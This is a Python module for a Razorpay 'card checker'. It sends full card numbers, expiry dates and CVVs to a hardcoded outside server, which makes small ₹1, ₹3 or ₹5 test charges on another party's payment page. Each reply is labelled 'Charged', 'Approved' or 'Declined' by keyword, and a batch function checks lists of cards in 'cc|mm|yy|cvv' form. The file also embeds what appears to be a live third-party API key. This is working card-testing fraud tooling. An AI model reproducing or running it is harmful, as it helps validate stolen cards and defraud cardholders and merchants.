"""
Razorpay Gateway with ₹1, ₹3, ₹5 variants
API: http://31.97.9.26:5000/razorpay
"""
import aiohttp
import asyncio
import json
import re
from typing import Dict

async def razorpay_check(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    amount: int = 1,
    site: str = "https://razorpay.me/@ukinternational",
    browserless_api: str = "2To6ksOL4K1z5E2dd0b5229fbb89331fb1ddfe831bec83d74"
) -> Dict:
    """
    Razorpay payment gateway check
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
        amount: Amount in INR (1, 3, or 5)
        site: Razorpay payment page URL
        browserless_api: Browserless API key
    
    Returns:
        dict: {'status': str, 'response': str, 'amount': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # Build API URL
    api_url = (
        f"http://31.97.9.26:5000/razorpay?"
        f"browserlessapi={browserless_api}&"
        f"site={site}&"
        f"cc={full_card}&"
        f"amount={amount}"
    )
    
    try:
        # Configure timeout (3 minutes)
        timeout = aiohttp.ClientTimeout(total=180)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                api_url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
            ) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Declined',
                        'response': f'API returned HTTP {resp.status}',
                        'amount': f'₹{amount}'
                    }
                
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Try to extract JSON
                    match = re.search(r'\{.*\}', api_response, re.DOTALL)
                    if match:
                        try:
                            data = json.loads(match.group(0))
                        except:
                            data = {'Response': api_response[:200]}
                    else:
                        data = {'Response': api_response[:200]}
                
                # Extract response
                response = data.get('Response') or data.get('response') or data.get('msg') or 'No response'
                response_lower = str(response).lower()
                
                # Determine status
                # Charged indicators
                if any(keyword in response_lower for keyword in [
                    'payment successful', 'successfully charged', 'thank you',
                    'order placed', 'payment completed', 'charged'
                ]):
                    status = 'Charged'
                
                # Approved indicators (CVV/3DS/Auth required)
                elif any(keyword in response_lower for keyword in [
                    'approved', '3ds', 'authenticate', 'cvv', 'cvc',
                    'incorrect_cvc', 'incorrect cvv', 'authentication required',
                    'card is live', 'insufficient funds', 'success'
                ]):
                    status = 'Approved'
                
                # Declined indicators
                elif any(keyword in response_lower for keyword in [
                    'declined', 'card declined', 'do_not_honor',
                    'generic_decline', 'invalid', 'expired', 'failed'
                ]):
                    status = 'Declined'
                
                # Unknown
                else:
                    status = 'Unknown'
                
                return {
                    'status': status,
                    'response': response,
                    'amount': f'₹{amount}'
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Declined',
            'response': 'Request timed out after 3 minutes',
            'amount': f'₹{amount}'
        }
    except Exception as e:
        return {
            'status': 'Declined',
            'response': f'Connection error: {str(e)[:100]}',
            'amount': f'₹{amount}'
        }


async def razorpay_1rs_check(cc: str, mm: str, yy: str, cvv: str) -> Dict:
    """Razorpay ₹1 check"""
    return await razorpay_check(cc, mm, yy, cvv, amount=1)


async def razorpay_3rs_check(cc: str, mm: str, yy: str, cvv: str) -> Dict:
    """Razorpay ₹3 check"""
    return await razorpay_check(cc, mm, yy, cvv, amount=3)


async def razorpay_5rs_check(cc: str, mm: str, yy: str, cvv: str) -> Dict:
    """Razorpay ₹5 check"""
    return await razorpay_check(cc, mm, yy, cvv, amount=5)


async def razorpay_mass_check(cards: list, amount: int = 1) -> list:
    """
    Mass check multiple cards (limit 10)
    
    Args:
        cards: List of card strings (cc|mm|yy|cvv)
        amount: Amount in INR
    
    Returns:
        list: List of result dicts
    """
    # Limit to 10 cards
    cards = cards[:10]
    
    results = []
    for card in cards:
        parts = card.split('|')
        if len(parts) != 4:
            results.append({
                'card': card,
                'status': 'Declined',
                'response': 'Invalid card format',
                'amount': f'₹{amount}'
            })
            continue
        
        cc, mm, yy, cvv = parts
        result = await razorpay_check(cc, mm, yy, cvv, amount)
        result['card'] = card
        results.append(result)
        
        # Small delay
        await asyncio.sleep(1)
    
    return results
